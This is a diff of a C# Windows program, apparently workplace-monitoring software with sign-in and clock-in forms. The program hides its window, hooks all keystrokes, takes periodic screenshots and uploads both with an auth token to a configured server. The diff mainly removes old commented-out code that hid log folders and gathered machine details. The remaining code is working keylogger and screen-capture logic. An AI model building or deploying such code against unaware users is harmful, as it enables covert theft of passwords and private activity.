@@ -96,16 +96,7 @@ namespace advanced_ckey
 
         private void timer1_Tick(object sender, EventArgs e)   //timer1 set to 1 to gets the active windows title at timer 1 ticking
         {
-            if(helper.islogged )
-            {
 
-          
-            if (strin != GetActiveWindowTitle())
-            {
-                textBox1.Text = textBox1.Text + Environment.NewLine + Environment.NewLine + "[" + GetActiveWindowTitle() + "]" + Environment.NewLine;
-                strin = GetActiveWindowTitle();
-            }
-            }
         }
 
         private void K_Down(string key)
@@ -143,11 +134,8 @@ namespace advanced_ckey
 
         public void screenshot()  // the method that handles the screenshot
         {
-            string filename = "Screencapture" + DateTime.Now.ToString("ddMMyyyy-hhmmss") + ".png";
             try
             {
-                //    MessageBox.Show( filename + ".com");
-
                 Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
                 Bitmap bitmap = new Bitmap( Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
 
@@ -157,44 +145,21 @@ namespace advanced_ckey
                     captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                 }
                 string screenshot="";
-              using (  System.IO.MemoryStream stream = new System.IO.MemoryStream())
+                using (  System.IO.MemoryStream stream = new System.IO.MemoryStream())
                 {
-
-
-                bitmap.Save( stream, ImageFormat.Jpeg);
-                byte[] imageBytes = stream.ToArray();
-                    //    string path = @"C:\MyDir\Screenshot\" + filename;
-                    //    bitmap.Save( path, ImageFormat.Jpeg);
-                    //    byte[] imageBytes = File.ReadAllBytes( path );
-               
-                screenshot = Convert.ToBase64String(imageBytes);
+                    bitmap.Save( stream, ImageFormat.Jpeg);
+                    byte[] imageBytes = stream.ToArray();
+                    screenshot = Convert.ToBase64String(imageBytes);
                 }
 
                 string keystrokes = JsonSerializer.Serialize(this.loggedText);
-             //   MessageBox.Show( keystrokes );
-            //    MessageBox.Show( screenshot.Length.ToString() );
-            //    textBox1.Text += keystrokes;
-           //     MessageBox.Show( textBox1.Text );
-            //    textBox1.Text += screenshot;
-            //     screenshot = "";
-
-                //    MessageBox.Show( "xxx-" + screenshot + ".com");
-                //  what is it now now that u want now 
-                //  sjsdbbdjd ne3r rn what do you need now
-
                 try
                 {
                     string URI = "https://" + Properties.Settings.Default.weburl + "/widgets/Workplace_Log?pc_widget_output_method=JSON";
 
-                    //    string defaultParameters = "user_id=" + Properties.Settings.Default.user_id + "&auth_token=" + Properties.Settings.Default.auth_token + "&";
-
                     using (WebClient wc = new WebClient())
                     {
                         wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
-                        //    string parameters = "texts=" + keystrokes + "&screenshot=" + screenshot + "&window_title=" + this.GetActiveWindowTitle();
-                        //    MessageBox.Show( keystrokes ); 
-                        //    MessageBox.Show( parameters.Length.ToString() ); 
-                        //    string jsonResponse = wc.UploadString( URI, defaultParameters + parameters );
                         NameValueCollection paramsX = new NameValueCollection();
 
                         paramsX.Add("user_id", Properties.Settings.Default.user_id);
@@ -209,12 +174,17 @@ namespace advanced_ckey
                         {
                             Byte[] responseBytes = wc.UploadValues( URI, "POST", paramsX );
                             jsonResponse = Encoding.UTF8.GetString(responseBytes);
-                        //    MessageBox.Show( jsonResponse );
-                        //    Console.Write(jsonResponse);
                             int ci = 0;
                             foreach( NameValueCollection xParam in this.savedRequests )
                             {
-                                wc.UploadValues(URI, "POST", xParam );
+                                try
+                                {
+                                    wc.UploadValues(URI, "POST", xParam );
+                                }
+                                catch( Exception )
+                                {
+
+                                }
                                 this.savedRequests.RemoveAt( ci );
                                 ci++;
                             }
@@ -224,12 +194,8 @@ namespace advanced_ckey
                             this.savedRequests.Add( paramsX );
                         }
                         this.loggedText.Clear();
-
-                        //    Console.Write( jsonResponse ); 
                         dynamic result = JsonValue.Parse(jsonResponse);
 
-                        //    MessageBox.Show( defaultParameters );
-                        //   MessageBox.Show( parameters.Length.ToString() ); 
 
                         try
                         {
@@ -237,12 +203,11 @@ namespace advanced_ckey
                             {
                                 Properties.Settings.Default.auth_token = string.Empty;
                                 Properties.Settings.Default.user_id = string.Empty;
-                               // MessageBox.Show( "Authentication failed" );
                                 if (helper.iswaiting == false)
                                 {
                                     helper.islogged = false;
-                                    var k = new Formlog();
-                                    k.Show();
+                                    //  var k = new Formlog();
+                                    Program.GetSignInForm().Show();
                                 }
                                 return;
                             }
@@ -261,8 +226,8 @@ namespace advanced_ckey
                                 if (helper.iswaiting == false)
                                 {
                                     helper.islogged = false;
-                                    var k = new Formlog();
-                                    k.Show();
+                                    //  var k = new Formlog();
+                                    Program.GetSignInForm().Show();
                                 }
 
                             }
@@ -277,8 +242,8 @@ namespace advanced_ckey
                     if (helper.iswaiting == false)
                     {
                         helper.islogged = false;
-                        var k = new Formlog();
-                        k.Show();
+                        //  var k = new Formlog();
+                        Program.GetSignInForm().Show();
                     }
                     // MessageBox.Show( x2.Message );
                 }
@@ -288,8 +253,8 @@ namespace advanced_ckey
                 if (helper.iswaiting == false)
                 {
                     helper.islogged = false;
-                    var k = new Formlog();
-                    k.Show();
+                    //  var k = new Formlog();
+                    Program.GetSignInForm().Show();
                 }
                 // MessageBox.Show( x1.Message );
             }
@@ -297,13 +262,7 @@ namespace advanced_ckey
 
         public void savetextfile()    // method saving textfile to file explorer
         {
-            try
-            {
-            //    File.WriteAllText(@"C:\MyDirr\Keyboard.txt", textBox1.Text);
-            }
-            catch (Exception)
-            {
-            }
+
         }
 
         DirectoryInfo ch;
@@ -312,52 +271,6 @@ namespace advanced_ckey
         private void Form1_Load(object sender, EventArgs e)
         {
             this.Hide();
-            try
-            {
-            //    Directory.CreateDirectory(@"C:\MyDir\Screenshot");  // create a diretory for saving the screenshot file
-            //    Directory.CreateDirectory(@"C:\MyDirr");  // create a diretory for saving the screenshot file
-            //    string filepath;
-            //    filepath = @"C:\MyDirr\Keyboard.txt"; //create a text file for saving the keylog
-            //    if (File.Exists(filepath))
-                {
-                }
-            //    else
-                {
-            //        File.Create(filepath);
-                }
-            }
-            catch (Exception)
-            {
-            }
-
-            try  //hides keylogger folder
-            {
-            //    ch = new DirectoryInfo(@"C:\MyDirr");
-            //    ch.Attributes = FileAttributes.Hidden;
-            //  //  MessageBox.Show("Hidden");
-            }
-            catch { }
-
-            try  //hides keylogger folder
-            {
-            //    ch = new DirectoryInfo(@"C:\MyDir");
-            //    ch.Attributes = FileAttributes.Hidden;
-                //  MessageBox.Show("Hidden");
-            }
-            catch { }
-
-
-            //try
-            //{
-
-            //    ch = new DirectoryInfo(txtFilePath.Text);
-            //    ch.Attributes = FileAttributes.Normal;
-            //      MessageBox.Show("Visible");
-
-            //}
-            //catch { }
-
-
             keylog_timer.Start();   // write textbox1.text strings into a file
             Sceenshot_timer.Start();  //starts sccenshot timer at every 1 minutes
             keyboardLanguages();  //get the keyboard language {input keyboard language installed}
@@ -394,22 +307,10 @@ namespace advanced_ckey
                     }
             }
 
-            textBox1.Text = DateTime.Now + Environment.NewLine + Environment.NewLine;  // get the present time of the day
-
-
             try
             {
-                textBox1.Text = Environment.NewLine + textBox1.Text + "User Name:             " + Environment.UserName.ToString();  // gives information about the operating system
-                textBox1.Text = textBox1.Text + Environment.NewLine + "Computer Name:         " + Environment.MachineName.ToString();    // gives information about the operating system
-                textBox1.Text = textBox1.Text + Environment.NewLine + "OS Version:            " + Environment.OSVersion.ToString();     // gives information about the operating system
-                textBox1.Text = textBox1.Text + Environment.NewLine + "Runtime:               " + Environment.Version.ToString();      // gives information about the operating system
-                textBox1.Text = textBox1.Text + Environment.NewLine + "System Root:           " + Environment.SystemDirectory.ToString();    
-                textBox1.Text = textBox1.Text + Environment.NewLine + "User Domain Name:      " + Environment.UserName.ToString();     
-                textBox1.Text = textBox1.Text + Environment.NewLine + Environment.NewLine;
-
                 K.CreateHook();   // this is the code that takes the keystroke from the keyboard class we created
                 timer1.Start();   // gets active window name and if not wanted delete this line of code
-               
             }
             catch (Exception)
             {
@@ -428,8 +329,6 @@ namespace advanced_ckey
             {
                 screenshot();
             }
-           
-           
         }
 
         [DllImport("user32.dll", EntryPoint = "ToUnicodeEx", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
@@ -465,14 +364,6 @@ namespace advanced_ckey
 
         private void notifyIcon1_BalloonTipClicked(object sender, EventArgs e)
         {
-          
-              
-              
-                  
-
-            
-
-          
 
         }
 
@@ -483,8 +374,7 @@ namespace advanced_ckey
 
         private void notifyIcon1_Click(object sender, EventArgs e)
         {
-            Formlog ky = new Formlog();
-            ky.Show();
+            Program.GetClockInForm().Show();
         }
     }
 }
